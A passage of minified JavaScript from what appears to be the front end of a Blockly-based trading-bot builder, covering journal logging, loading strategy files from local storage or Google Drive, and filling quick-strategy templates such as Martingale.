                                }, t) : (0, i.jsxs)("div", {
                                    className: "dc-expansion-panel__content-array",
                                    children: [(0, i.jsx)("span", {
                                        className: "dc-expansion-panel__content-array-item-index",
                                        children: `${t+1}: `
                                    }), null == e ? void 0 : null === (l = e.value) || void 0 === l ? void 0 : l.toString()]
                                }, t)
                            })
                        })
                    },
                    eG = e => {
                        let {
                            message: t,
                            onResize: n
                        } = e, [a, o] = l.useState([]), [s, r] = l.useState(!1);
                        return l.useEffect(() => {
                            "function" == typeof n && n()
                        }, [s, n]), (0, i.jsxs)(l.Fragment, {
                            children: [(0, i.jsxs)("div", {
                                className: eB()("dc-expansion-panel__header-container", {
                                    "dc-expansion-panel__header-active": s
                                }),
                                children: [t.header, (0, i.jsx)(eF.Z, {
                                    className: "dc-expansion-panel__header-chevron-icon",
                                    onClick: () => {
                                        r(!s)
                                    },
                                    height: "24px",
                                    width: "24px"
                                })]
                            }), s && (Array.isArray(t.content) ? (0, i.jsx)(ej, {
                                array: t.content,
                                open_ids: a,
                                setOpenIds: o
                            }) : t.content)]
                        })
                    },
                    eX = e => {
                        switch (e) {
                            case "error":
                                return "IcAlertDanger";
                            case "warn":
                            default:
                                return "IcAlertWarning";
                            case "info":
                                return "IcAlertInfo"
                        }
                    },
                    eY = e => {
                        let {
                            unique_id: t,
                            type: n,
                            message: a,
                            btn_text: l,
                            onClick: o
                        } = e;
                        return (0, i.jsxs)(i.Fragment, {
                            children: [(0, i.jsxs)("div", {
                                className: "notify__item-container",
                                children: [(0, i.jsx)(eP.J, {
                                    icon: eX(n),
                                    size: "22"
                                }, `${t}_icon`), (0, i.jsx)("div", {
                                    className: "notify__item-message",
                                    children: a
                                }, `${t}_text`)]
                            }, `${t}_message`), (0, i.jsx)(eV.Z, {
                                className: "notify__item-button",
                                text: l,
                                onClick: o,
                                has_effect: !0,
                                secondary: !0
                            }, `${t}_btn`)]
                        })
                    },
                    eH = e => t => (0, i.jsx)(eG, {
                        message: e,
                        onResize: t
                    }),
                    e$ = (e, t, n, a) => {
                        n(eY({
                            unique_id: t,
                            type: "error",
                            message: e,
                            btn_text: (0, m.NC)("Go to block"),
                            onClick: () => {
                                a()
                            }
                        }))
                    },
                    eW = (e, t, n, a) => {
                        let {
                            message: i,
                            block_id: l,
                            variable_name: o
                        } = e;
                        if (void 0 === i && null != o) return e$((0, m.NC)("Variable '{{variable_name}}' has no value. Please set a value for variable '{{variable_name}}' to notify.", {
                            variable_name: o
                        }), l, t, n), !0;
                        if (null === i) return a("NULL"), !0;
                        if (Object.is(i, NaN)) return e$((0, m.NC)("Tried to perform an invalid operation."), l, t, n), !0;
                        if (Array.isArray(i)) {
                            let e = i.length;
                            return a(eH({
                                header: "null" !== o ? `${o}: (${e})` : (0, m.NC)("List: ({{message_length}})", {
                                    message_length: e
                                }),
                                content: ez(i)
                            })), !0
                        }
                        return "boolean" == typeof i && (a(i.toString()), !0)
                    },
                    ez = e => e.map((e, t) => ({
                        id: `${Date.now()}-${t}`,
                        value: e && Array.isArray(e) ? ez(e) : e
                    }));
                var eZ = n("26961"),
                    eK = n.n(eZ);
                let eq = (e, t, n) => t && eQ(e, n)[t] || n,
                    eQ = (e, t) => {
                        try {
                            let t = sessionStorage.getItem(e),
                                n = eK().decompress(t),
                                a = JSON.parse(n);
                            if (a) return a
                        } catch (e) {}
                        return t
                    },
                    eJ = (e, t) => {
                        try {
                            let n = eK().compress(JSON.stringify(t));
                            sessionStorage.setItem(e, n)
                        } catch (e) {
                            console.warn("Could not write to storage.")
                        }
                    };
                class e0 {
                    restoreStoredJournals() {
                        let {
                            loginid: e
                        } = this.core.client;
                        this.journal_filters = (0, f.$8)("journal_filter") ? ? this.filters.map(e => e.id), this.unfiltered_messages = eq(this.JOURNAL_CACHE, e, [])
                    }
                    getServerTime() {
                        var e;
                        return null === (e = this.core) || void 0 === e ? void 0 : e.common.server_time.get()
                    }
                    toggleFilterDialog() {
                        this.is_filter_dialog_visible = !this.is_filter_dialog_visible
                    }
                    onLogSuccess(e) {
                        let {
                            log_type: t,
                            extra: n
                        } = e;
                        this.pushMessage(t, c.MessageTypes.SUCCESS, "", n)
                    }
                    onError(e) {
                        this.pushMessage(e, c.MessageTypes.ERROR)
                    }
                    onNotify(e) {
                        let {
                            run_panel: t,
                            dbot: n
                        } = this.root_store, {
                            message: a,
                            className: i,
                            message_type: l,
                            sound: o,
                            block_id: s,
                            variable_name: r
                        } = e;
                        if (eW({
                                message: a,
                                block_id: s,
                                variable_name: r
                            }, t.showErrorMessage, () => n.centerAndHighlightBlock(s, !0), e => this.pushMessage(e, l || c.MessageTypes.NOTIFY, i))) {
                            this.playAudio(o);
                            return
                        }
                        this.pushMessage(a, l || c.MessageTypes.NOTIFY, i), this.playAudio(o)
                    }
                    pushMessage(e, t, n) {
                        let a = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {},
                            {
                                client: i
                            } = this.core,
                            {
                                loginid: l,
                                account_list: o
                            } = i;
                        if (l) {
                            let e = null == o ? void 0 : o.find(e => (null == e ? void 0 : e.loginid) === l);
                            a.current_currency = (null == e ? void 0 : e.is_virtual) ? "Demo" : null == e ? void 0 : e.currency
                        } else if (e === c.LogTypes.WELCOME) return;
                        let s = (0, d.p6d)(this.getServerTime()),
                            r = (0, d.p6d)(this.getServerTime(), "HH:mm:ss [GMT]"),
                            u = (0, eD.Z)();
                        this.unfiltered_messages.unshift({
                            date: s,
                            time: r,
                            message: e,
                            message_type: t,
                            className: n,
                            unique_id: u,
                            extra: a
                        }), this.unfiltered_messages = this.unfiltered_messages.slice()
                    }
                    get filtered_messages() {
                        return this.unfiltered_messages.filter(e => this.journal_filters.length && this.journal_filters.some(t => e.message_type === t))
                    }
                    get checked_filters() {
                        return this.journal_filters.filter(e => null != e)
                    }
                    filterMessage(e, t) {
                        e ? this.journal_filters.push(t) : this.journal_filters.splice(this.journal_filters.indexOf(t), 1), (0, f.Jp)("journal_filter", this.journal_filters)
                    }
                    clear() {
                        this.unfiltered_messages = this.unfiltered_messages.slice(0, 0)
                    }
                    registerReactions() {
                        let e = this.core.client,
                            t = (0, s.U5)(() => this.unfiltered_messages, t => {
                                let n = eQ(this.JOURNAL_CACHE, {});
                                n[e.loginid] = null == t ? void 0 : t.slice(0, 5e3), eJ(this.JOURNAL_CACHE, n)
                            }),
                            n = (0, s.U5)(() => null == e ? void 0 : e.loginid, async t => {
                                await (0, s.gx)(() => {
                                    var n;
                                    return !!(null === (n = e.account_list) || void 0 === n ? void 0 : n.find(e => e.loginid === t))
                                }), this.unfiltered_messages = eq(this.JOURNAL_CACHE, t, []), 0 === this.unfiltered_messages.length ? this.pushMessage(c.LogTypes.WELCOME, c.MessageTypes.SUCCESS, "journal__text") : this.unfiltered_messages.length > 0 && this.pushMessage(c.LogTypes.WELCOME_BACK, c.MessageTypes.SUCCESS, "journal__text")
                            }, {
                                fireImmediately: !0
                            });
                        return () => {
                            t(), n()
                        }
                    }
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "disposeReactionsFn", void 0), (0, o._)(this, "JOURNAL_CACHE", "journal_cache"), (0, o._)(this, "is_filter_dialog_visible", !1), (0, o._)(this, "filters", [{
                            id: c.MessageTypes.ERROR,
                            label: (0, m.NC)("Errors")
                        }, {
                            id: c.MessageTypes.NOTIFY,
                            label: (0, m.NC)("Notifications")
                        }, {
                            id: c.MessageTypes.SUCCESS,
                            label: (0, m.NC)("System")
                        }]), (0, o._)(this, "journal_filters", []), (0, o._)(this, "unfiltered_messages", []), (0, o._)(this, "playAudio", e => {
                            e !== (0, eU.vc)().lists.NOTIFICATION_SOUND[0][1] && document.getElementById(e).play()
                        }), (0, s.rC)(this, {
                            is_filter_dialog_visible: s.LO,
                            journal_filters: s.LO.shallow,
                            filters: s.LO.shallow,
                            unfiltered_messages: s.LO.shallow,
                            toggleFilterDialog: s.aD.bound,
                            onLogSuccess: s.aD.bound,
                            onError: s.aD.bound,
                            onNotify: s.aD.bound,
                            pushMessage: s.aD.bound,
                            filtered_messages: s.Fl,
                            getServerTime: s.aD.bound,
                            playAudio: s.aD.bound,
                            checked_filters: s.Fl,
                            filterMessage: s.aD.bound,
                            clear: s.aD.bound,
                            registerReactions: s.aD.bound,
                            restoreStoredJournals: s.aD.bound
                        }), this.root_store = e, this.core = t, this.disposeReactionsFn = this.registerReactions(), this.restoreStoredJournals()
                    }
                }
                var e1 = n("26855"),
                    e2 = n("49985"),
                    e9 = n("42457");
                class e5 {
                    get preview_workspace() {
                        return this.tab_name === e2.y.TAB_LOCAL ? this.local_workspace : this.tab_name === e2.y.TAB_RECENT ? this.recent_workspace : null
                    }
                    get selected_strategy() {
                        return this.dashboard_strategies.find(e => e.id === this.selected_strategy_id) ? ? this.dashboard_strategies[0]
                    }
                    get tab_name() {
                        if (this.core.ui.is_mobile) {
                            if (0 === this.active_index) return e2.y.TAB_LOCAL;
                            if (1 === this.active_index) return e2.y.TAB_GOOGLE
                        }
                        return 0 === this.active_index ? e2.y.TAB_RECENT : 1 === this.active_index ? e2.y.TAB_LOCAL : 2 === this.active_index ? e2.y.TAB_GOOGLE : ""
                    }
                    constructor(e, t) {
                        var n = this;
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "imported_strategy_type", "pending"), (0, o._)(this, "recent_workspace", null), (0, o._)(this, "local_workspace", null), (0, o._)(this, "drop_zone", void 0), (0, o._)(this, "active_index", 0), (0, o._)(this, "is_load_modal_open", !1), (0, o._)(this, "is_explanation_expand", !1), (0, o._)(this, "is_open_button_loading", !1), (0, o._)(this, "is_open_button_disabled", !1), (0, o._)(this, "loaded_local_file", null), (0, o._)(this, "recent_strategies", []), (0, o._)(this, "dashboard_strategies", []), (0, o._)(this, "selected_strategy_id", ""), (0, o._)(this, "is_strategy_loaded", !1), (0, o._)(this, "is_delete_modal_open", !1), (0, o._)(this, "is_strategy_removed", !1), (0, o._)(this, "current_workspace_id", ""), (0, o._)(this, "upload_id", ""), (0, o._)(this, "setOpenButtonDisabled", e => {
                            this.is_open_button_disabled = e
                        }), (0, o._)(this, "getSelectedStrategyID", e => {
                            this.current_workspace_id = e
                        }), (0, o._)(this, "setDashboardStrategies", e => {
                            this.dashboard_strategies = e, !e.length && (this.selected_strategy_id = "")
                        }), (0, o._)(this, "getDashboardStrategies", async () => {
                            let e = await (0, c.getSavedWorkspaces)();
                            this.dashboard_strategies = e
                        }), (0, o._)(this, "onDriveOpen", async () => {
                            let {
                                google_drive: e
                            } = this.root_store, {
                                verifyGoogleDriveAccessToken: t
                            } = e;
                            if ("not_verified" === await t()) return;
                            e && (e.upload_id = (0, eD.Z)()), (0, eL.Oi)({
                                upload_provider: "google_drive",
                                upload_id: e.upload_id
                            });
                            let {
                                loadFile: n
                            } = this.root_store.google_drive, a = await n();
                            if (!a) return;
                            let i = null == a ? void 0 : a.xml_doc,
                                l = null == a ? void 0 : a.file_name;
                            await (0, c.load)({
                                block_string: i,
                                file_name: l,
                                workspace: window.Blockly.derivWorkspace,
                                from: c.save_types.GOOGLE_DRIVE,
                                drop_event: null,
                                strategy_id: null,
                                showIncompatibleStrategyDialog: null
                            });
                            let {
                                active_tab: o
                            } = this.root_store.dashboard;
                            2 === o && this.toggleLoadModal(), this.root_store.dashboard.is_dialog_open = !1
                        }), (0, o._)(this, "onEntered", () => {
                            if (0 === this.recent_strategies.length || this.tab_name !== e2.y.TAB_RECENT) return;
                            this.setOpenButtonDisabled(!0);
                            let {
                                blockly_store: e
                            } = this.root_store, {
                                setLoading: t
                            } = e;
                            t(!0), this.loadStrategyOnModalRecentPreview(this.selected_strategy_id), this.updateXmlValuesOnStrategySelection(), this.setOpenButtonDisabled(!1)
                        }), (0, o._)(this, "onLoadModalClose", () => {
                            this.local_workspace && (this.local_workspace = null), this.setActiveTabIndex(0), this.setLoadedLocalFile(null)
                        }), (0, o._)(this, "onZoomInOutClick", e => {
                            this.preview_workspace && this.preview_workspace.zoomCenter(e ? 1 : -1)
                        }), (0, o._)(this, "setActiveTabIndex", e => {
                            this.active_index = e
                        }), (0, o._)(this, "setLoadedLocalFile", e => {
                            this.loaded_local_file = e
                        }), (0, o._)(this, "setRecentStrategies", e => {
                            this.recent_strategies = e
                        }), (0, o._)(this, "refreshStrategies", () => {
                            this.setRecentStrategies(this.recent_strategies)
                        }), (0, o._)(this, "setSelectedStrategyId", e => {
                            this.selected_strategy_id = e
                        }), (0, o._)(this, "toggleExplanationExpand", () => {
                            this.is_explanation_expand = !this.is_explanation_expand
                        }), (0, o._)(this, "toggleLoadModal", () => {
                            var e;
                            this.is_load_modal_open = !this.is_load_modal_open, null === (e = this.recent_workspace) || void 0 === e || e.dispose(), this.recent_workspace = null, this.setLoadedLocalFile(null)
                        }), (0, o._)(this, "toggleTourLoadModal", function() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : !n.is_load_modal_open;
                            n.is_load_modal_open = e
                        }), (0, o._)(this, "updateListStrategies", e => {
                            e && (this.dashboard_strategies = e)
                        }), (0, o._)(this, "getSaveType", e => {
                            switch (e) {
                                case c.save_types.UNSAVED:
                                    return (0, m.NC)("Unsaved");
                                case c.save_types.LOCAL:
                                    return (0, m.NC)("Local");
                                case c.save_types.GOOGLE_DRIVE:
                                    return (0, m.NC)("Google Drive");
                                default:
                                    return (0, m.NC)("Unsaved")
                            }
                        }), (0, o._)(this, "onToggleDeleteDialog", e => {
                            this.is_delete_modal_open = e
                        }), (0, o._)(this, "resetBotBuilderStrategy", () => {
                            let e = window.Blockly.derivWorkspace;
                            e && (window.Blockly.derivWorkspace.asyncClear(), window.Blockly.Xml.domToWorkspace(window.Blockly.utils.xml.textToDom(e.cached_xml.main), e), window.Blockly.derivWorkspace.strategy_to_load = e.cached_xml.main)
                        }), (0, o._)(this, "loadStrategyToBuilder", async e => {
                            if (null == e ? void 0 : e.id) {
                                var t;
                                await (0, c.load)({
                                    block_string: e.xml,
                                    strategy_id: e.id,
                                    file_name: e.name,
                                    workspace: null === (t = window.Blockly) || void 0 === t ? void 0 : t.derivWorkspace,
                                    from: e.save_type,
                                    drop_event: {},
                                    showIncompatibleStrategyDialog: !1
                                }), window.Blockly.derivWorkspace.strategy_to_load = e.xml
                            }
                        }), (0, o._)(this, "refreshStrategiesTheme", async () => {
                            var e, t, n, a;
                            this.recent_workspace && (this.recent_workspace.RTL = (0, e1.rK)()), await (0, c.load)({
                                block_string: null === (e = this.selected_strategy) || void 0 === e ? void 0 : e.xml,
                                drop_event: {},
                                workspace: this.recent_workspace,
                                file_name: null === (t = this.selected_strategy) || void 0 === t ? void 0 : t.name,
                                strategy_id: null === (n = this.selected_strategy) || void 0 === n ? void 0 : n.id,
                                from: null === (a = this.selected_strategy) || void 0 === a ? void 0 : a.save_type,
                                showIncompatibleStrategyDialog: !1
                            })
                        }), (0, o._)(this, "loadFileFromRecent", async () => {
                            var e;
                            if (this.is_open_button_loading = !0, !this.selected_strategy) {
                                window.Blockly.derivWorkspace.asyncClear(), window.Blockly.Xml.domToWorkspace(window.Blockly.utils.xml.textToDom(window.Blockly.derivWorkspace.strategy_to_load), window.Blockly.derivWorkspace), this.is_open_button_loading = !1;
                                return
                            }(0, c.removeExistingWorkspace)(this.selected_strategy.id), await (0, c.load)({
                                block_string: null === (e = this.selected_strategy) || void 0 === e ? void 0 : e.xml,
                                strategy_id: this.selected_strategy.id,
                                file_name: this.selected_strategy.name,
                                workspace: window.Blockly.derivWorkspace,
                                from: this.selected_strategy.save_type,
                                drop_event: {},
                                showIncompatibleStrategyDialog: !1
                            }), (await (0, c.getSavedWorkspaces)()).map(e => {
                                let {
                                    xml: t,
                                    id: n
                                } = e;
                                this.selected_strategy.id === n && (window.Blockly.derivWorkspace.strategy_to_load = t)
                            }), this.is_open_button_loading = !1
                        }), (0, o._)(this, "loadFileFromLocal", () => {
                            this.is_open_button_loading = !0, this.loaded_local_file && this.readFile(!1, {}, this.loaded_local_file)
                        }), (0, o._)(this, "onActiveIndexChange", () => {
                            this.setOpenButtonDisabled(!0), this.tab_name === e2.y.TAB_RECENT ? (this.loadStrategyOnModalRecentPreview(this.selected_strategy_id), this.updateXmlValuesOnStrategySelection()) : this.recent_workspace && setTimeout(() => {
                                var e;
                                null === (e = this.recent_workspace) || void 0 === e || e.dispose(), this.recent_workspace = null
                            }), this.tab_name === e2.y.TAB_LOCAL ? !this.drop_zone && (this.drop_zone = document.querySelector("load-strategy__local-dropzone-area"), this.drop_zone && this.drop_zone.addEventListener("drop", e => this.handleFileChange(e, !1))) : this.local_workspace && setTimeout(() => {
                                var e;
                                null === (e = this.local_workspace) || void 0 === e || e.dispose(), this.local_workspace = null, this.setLoadedLocalFile(null)
                            }, 0), this.tab_name !== e2.y.TAB_LOCAL && this.drop_zone && this.drop_zone.removeEventListener("drop", e => this.handleFileChange(e, !1)), this.setOpenButtonDisabled(!1)
                        }), (0, o._)(this, "handleFileChange", function(e) {
                            let t, a = !(arguments.length > 1) || void 0 === arguments[1] || arguments[1];
                            n.imported_strategy_type = "pending", n.upload_id = (0, eD.Z)(), "drop" === e.type ? (e.stopPropagation(), e.preventDefault(), {
                                files: t
                            } = e.dataTransfer) : {
                                files: t
                            } = e.target;
                            let [i] = t;
                            if (!a) {
                                if (!i.name.includes("xml")) return !1;
                                n.setLoadedLocalFile(i), n.getDashboardStrategies()
                            }
                            return n.readFile(!a, e, i), e.target.value = "", !0
                        }), (0, o._)(this, "readFile", (e, t, n) => {
                            let a = new FileReader,
                                i = (null == n ? void 0 : n.name.replace(/\.[^/.]+$/, "")) || "";
                            a.onload = (0, s.aD)(async e => {
                                var n;
                                let a = {
                                    block_string: null == e ? void 0 : null === (n = e.target) || void 0 === n ? void 0 : n.result,
                                    drop_event: t,
                                    from: c.save_types.LOCAL,
                                    workspace: null,
                                    file_name: i,
                                    strategy_id: "",
                                    showIncompatibleStrategyDialog: !1
                                };
                                this.local_workspace && (this.local_workspace.dispose(), this.local_workspace = null), this.loadStrategyOnModalLocalPreview(a), this.setOpenButtonDisabled(!1)
                            }), a.readAsText(n)
                        }), (0, o._)(this, "saveStrategyToLocalStorage", async () => {
                            var e;
                            let {
                                save_modal: t
                            } = this.root_store, {
                                updateBotName: n
                            } = t, {
                                convertedDom: a,
                                from: i,
                                file_name: l
                            } = window.Blockly.xmlValues;
                            n(l), await (0, c.saveWorkspaceToRecent)(a, i);
                            let o = await (0, c.getSavedWorkspaces)();
                            (null == o ? void 0 : o.length) > 0 && this.setSelectedStrategyId(null === (e = o[0]) || void 0 === e ? void 0 : e.id)
                        }), (0, o._)(this, "loadStrategyOnBotBuilder", async () => {
                            let {
                                strategy_id: e = window.Blockly.utils.idGenerator.genUid(),
                                convertedDom: t,
                                block_string: n
                            } = window.Blockly.xmlValues, a = window.Blockly.derivWorkspace;
                            window.Blockly.Xml.clearWorkspaceAndLoadFromXml(t, a), a.cleanUp(), a.clearUndo(), a.current_strategy_id = e;
                            let i = (0, eR.dC)(n ? ? "");
                            (0, eL.WN)({
                                upload_provider: "my_computer",
                                upload_type: i,
                                upload_id: this.upload_id
                            })
                        }), (0, o._)(this, "updateXmlValuesOnStrategySelection", () => {
                            var e, t, n, a, i, l, o;
                            0 !== this.recent_strategies.length && (0, u.ox)({
                                strategy_id: this.selected_strategy_id,
                                convertedDom: null === (i = window) || void 0 === i ? void 0 : null === (a = i.Blockly) || void 0 === a ? void 0 : null === (n = a.utils) || void 0 === n ? void 0 : null === (t = n.xml) || void 0 === t ? void 0 : t.textToDom(null === (e = this.selected_strategy) || void 0 === e ? void 0 : e.xml),
                                file_name: null === (l = this.selected_strategy) || void 0 === l ? void 0 : l.name,
                                from: (null === (o = this.selected_strategy) || void 0 === o ? void 0 : o.save_type) || c.save_types.UNSAVED
                            })
                        }), (0, o._)(this, "loadStrategyOnModalRecentPreview", async e => {
                            var t, n, a, i, l, o, s, r, d, c;
                            if (this.setOpenButtonDisabled(!0), 0 === this.recent_strategies.length || this.tab_name !== e2.y.TAB_RECENT) return;
                            let {
                                blockly_store: m
                            } = this.root_store, {
                                setLoading: b
                            } = m, p = { ...u.Tj,
                                theme: null === (a = window) || void 0 === a ? void 0 : null === (n = a.Blockly) || void 0 === n ? void 0 : null === (t = n.Themes) || void 0 === t ? void 0 : t.zelos_renderer
                            };
                            this.setLoadedLocalFile(null), this.setSelectedStrategyId(e), await (0, e9._)("#load-strategy__blockly-container");
                            let f = document.getElementById("load-strategy__blockly-container");
                            if (f) {
                                !this.recent_workspace && (this.recent_workspace = window.Blockly.inject(f, p)), this.recent_workspace.RTL = (0, e1.rK)();
                                let e = null === (s = window.Blockly) || void 0 === s ? void 0 : null === (o = s.utils) || void 0 === o ? void 0 : null === (l = o.xml) || void 0 === l ? void 0 : l.textToDom(null === (i = this.selected_strategy) || void 0 === i ? void 0 : i.xml),
                                    t = null === (r = window.Blockly) || void 0 === r ? void 0 : r.getMainWorkspace();
                                null === (c = window.Blockly) || void 0 === c || null === (d = c.Xml) || void 0 === d || d.clearWorkspaceAndLoadFromXml(e, t)
                            }
                            b(!1), this.setOpenButtonDisabled(!1)
                        }), (0, o._)(this, "loadStrategyOnModalLocalPreview", async e => {
                            var t, n, a;
                            this.setOpenButtonDisabled(!0);
                            let i = { ...u.Tj,
                                theme: null === (a = window) || void 0 === a ? void 0 : null === (n = a.Blockly) || void 0 === n ? void 0 : null === (t = n.Themes) || void 0 === t ? void 0 : t.zelos_renderer
                            };
                            await (0, e9._)("#load-strategy__blockly-container");
                            let l = document.getElementById("load-strategy__blockly-container");
                            !this.local_workspace && (this.local_workspace = await window.Blockly.inject(l, i)), e.workspace = this.local_workspace, e.workspace && (e.workspace.RTL = (0, e1.rK)());
                            let o = (0, eR.dC)((null == e ? void 0 : e.block_string) ? ? ""),
                                s = await (0, c.load)(e);
                            (null == s ? void 0 : s.error) ? (null == s ? void 0 : s.error) && (0, eL.mu)({
                                upload_provider: "my_computer",
                                upload_id: this.upload_id,
                                upload_type: o,
                                error_message: s.error
                            }) : (0, eL.Oi)({
                                upload_provider: "my_computer",
                                upload_id: this.upload_id
                            })
                        }), (0, s.rC)(this, {
                            active_index: s.LO,
                            is_load_modal_open: s.LO,
                            is_explanation_expand: s.LO,
                            is_strategy_loaded: s.LO,
                            is_delete_modal_open: s.LO,
                            is_strategy_removed: s.LO,
                            loaded_local_file: s.LO,
                            recent_strategies: s.LO,
                            dashboard_strategies: s.LO,
                            selected_strategy_id: s.LO,
                            current_workspace_id: s.LO,
                            upload_id: s.LO,
                            preview_workspace: s.Fl,
                            selected_strategy: s.Fl,
                            tab_name: s.Fl,
                            is_open_button_disabled: s.LO,
                            setOpenButtonDisabled: s.aD.bound,
                            getSelectedStrategyID: s.aD.bound,
                            refreshStrategies: s.aD.bound,
                            loadStrategyToBuilder: s.aD.bound,
                            refreshStrategiesTheme: s.aD.bound,
                            handleFileChange: s.aD.bound,
                            loadFileFromRecent: s.aD.bound,
                            loadFileFromLocal: s.aD.bound,
                            imported_strategy_type: s.LO,
                            onActiveIndexChange: s.aD.bound,
                            onDriveOpen: s.aD.bound,
                            onEntered: s.aD.bound,
                            onLoadModalClose: s.aD.bound,
                            onZoomInOutClick: s.aD.bound,
                            setActiveTabIndex: s.aD.bound,
                            setLoadedLocalFile: s.aD.bound,
                            setRecentStrategies: s.aD.bound,
                            setSelectedStrategyId: s.aD.bound,
                            toggleExplanationExpand: s.aD.bound,
                            toggleLoadModal: s.aD.bound,
                            toggleTourLoadModal: s.aD.bound,
                            readFile: s.aD.bound,
                            resetBotBuilderStrategy: s.aD.bound,
                            setDashboardStrategies: s.aD.bound,
                            updateListStrategies: s.aD.bound,
                            onToggleDeleteDialog: s.aD,
                            loadStrategyOnModalRecentPreview: s.aD,
                            loadStrategyOnBotBuilder: s.aD,
                            saveStrategyToLocalStorage: s.aD,
                            updateXmlValuesOnStrategySelection: s.aD
                        }), this.root_store = e, this.core = t, (0, s.U5)(() => this.active_index, () => this.onActiveIndexChange()), (0, s.U5)(() => this.is_load_modal_open, async e => {
                            if (e) {
                                let e = await (0, c.getSavedWorkspaces)();
                                e && (this.setRecentStrategies(e), e.length > 0 && !this.selected_strategy_id && this.setSelectedStrategyId(e[0].id))
                            } else this.onLoadModalClose()
                        })
                    }
                }
                var e7 = n("30810");
                let e6 = (e, t, n, a) => {
                    if ("digits" === n || "highlowticks" === n) {
                        let n = document.createElement("value");
                        n.setAttribute("name", e), n.setAttribute("strategy_value", t);
                        let i = document.createElement("shadow");
                        i.setAttribute("type", "math_number_positive"), i.setAttribute("id", "p0O]7-M{ZORlORxGuIEb");
                        let l = document.createElement("field");
                        l.setAttribute("name", "NUM"), l.textContent = "0", i.appendChild(l), n.appendChild(i);
                        let o = a.querySelector('value[name="AMOUNT"]');
                        if (o) {
                            let e = o.parentNode;
                            e && e.insertBefore(n, o.nextSibling)
                        }
                    }
                    if ("PREDICTION" === e && a) {
                        let e = a.querySelector('block[type="trade_definition_tradeoptions"] > mutation');
                        e && e.setAttribute("has_prediction", "true")
                    }
                };
                var e3 = n("85414");
                class e4 {
                    constructor(e) {
                        var t = this;
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "is_open", !1), (0, o._)(this, "selected_strategy", "MARTINGALE"), (0, o._)(this, "form_data", {
                            symbol: (0, c.config)().QUICK_STRATEGY.DEFAULT.symbol,
                            tradetype: (0, c.config)().QUICK_STRATEGY.DEFAULT.tradetype,
                            durationtype: (0, c.config)().QUICK_STRATEGY.DEFAULT.durationtype,
                            action: "RUN"
                        }), (0, o._)(this, "is_contract_dialog_open", !1), (0, o._)(this, "is_stop_bot_dialog_open", !1), (0, o._)(this, "current_duration_min_max", {
                            min: 0,
                            max: 10
                        }), (0, o._)(this, "loss_threshold_warning_data", {
                            show: !1
                        }), (0, o._)(this, "additional_data", {}), (0, o._)(this, "setAdditionalData", e => {
                            this.additional_data = { ...this.additional_data,
                                ...e
                            }
                        }), (0, o._)(this, "setLossThresholdWarningData", e => {
                            this.loss_threshold_warning_data = { ...this.loss_threshold_warning_data,
                                ...e
                            }
                        }), (0, o._)(this, "initializeLossThresholdWarningData", () => {
                            this.loss_threshold_warning_data = {
                                show: !1,
                                highlight_field: [],
                                already_shown: !1
                            }
                        }), (0, o._)(this, "setFormVisibility", e => {
                            this.is_open = e
                        }), (0, o._)(this, "setSelectedStrategy", e => {
                            this.selected_strategy = e
                        }), (0, o._)(this, "setValue", (e, t) => {
                            this.form_data[e] = t
                        }), (0, o._)(this, "setCurrentDurationMinMax", function() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0,
                                n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 10;
                            t.current_duration_min_max = {
                                min: e,
                                max: n
                            }
                        }), (0, o._)(this, "onSubmit", async e => {
                            let {
                                contracts_for: t
                            } = (null === c.ApiHelpers || void 0 === c.ApiHelpers ? void 0 : c.ApiHelpers.instance) ? ? {};
                            if (!t) return;
                            let a = await t.getMarketBySymbol(e.symbol),
                                i = await t.getSubmarketBySymbol(e.symbol),
                                l = await t.getTradeTypeCategoryByTradeType(e.tradetype),
                                o = (0, e3.j)()[this.selected_strategy],
                                s = await n(5765)(`./${o.name}.xml`),
                                r = window.Blockly.utils.xml.textToDom(s.default);
                            e6("PREDICTION", "last_digit_prediction", l, r);
                            let d = (e, t) => {
                                    let n = null == r ? void 0 : r.querySelectorAll(`value[strategy_value="${e}"]`);
                                    null == n || n.forEach(n => {
                                        e.includes("boolean") ? t ? n.innerHTML = '<block type="logic_boolean"><field name="BOOL">TRUE</field></block>' : n.innerHTML = '<block type="logic_boolean"><field name="BOOL">FALSE</field></block>' : n.innerHTML = `<shadow type="math_number"><field name="NUM">${t}</field></shadow>`
                                    })
                                },
                                u = (e, t) => {
                                    let n = `${e.toUpperCase()}_LIST`,
                                        a = null == r ? void 0 : r.querySelectorAll(`field[name="${n}"]`);
                                    null == a || a.forEach(e => {
                                        e.innerHTML = t
                                    })
                                },
                                {
                                    unit: m,
                                    action: b,
                                    type: p,
                                    growth_rate: f,
                                    ..._
                                } = e,
                                h = {
                                    market: a,
                                    submarket: i,
                                    tradetypecat: l,
                                    dalembert_unit: m,
                                    oscar_unit: m,
                                    type: "both",
                                    ..._,
                                    purchase: p,
                                    growthrate: f ? f.toString() : void 0
                                };
                            Object.keys(h).forEach(e => {
                                let t = h[e];
                                isNaN(t) || "growthrate" === e ? "string" == typeof t && u(e, t) : d(e, t)
                            });
                            let {
                                derivWorkspace: v
                            } = Blockly;
                            "RUN" === b && (null == v || v.waitForBlockEvent({
                                block_type: "trade_definition",
                                event_type: window.Blockly.Events.BLOCK_CREATE,
                                timeout: 5e3
                            }).then(() => {
                                this.root_store.run_panel.onRunButtonClick()
                            })), this.setFormVisibility(!1), (0, C.J)((0, O.xG)()[O.tx.BOT_IMPORT]), await (0, c.load)({
                                block_string: window.Blockly.Xml.domToText(r),
                                file_name: o.label,
                                workspace: v,
                                from: e7.R.UNSAVED,
                                drop_event: null,
                                strategy_id: null,
                                showIncompatibleStrategyDialog: null
                            })
                        }), (0, o._)(this, "toggleStopBotDialog", () => {
                            this.is_contract_dialog_open = !this.is_contract_dialog_open, this.is_stop_bot_dialog_open = !this.is_stop_bot_dialog_open, this.setFormVisibility(!1)
                        }), (0, s.rC)(this, {
                            additional_data: s.LO,
                            current_duration_min_max: s.LO,
                            form_data: s.LO,
                            is_contract_dialog_open: s.LO,
                            is_open: s.LO,
                            is_stop_bot_dialog_open: s.LO,
                            initializeLossThresholdWarningData: s.aD,
                            selected_strategy: s.LO,
                            loss_threshold_warning_data: s.LO,
                            onSubmit: s.aD,
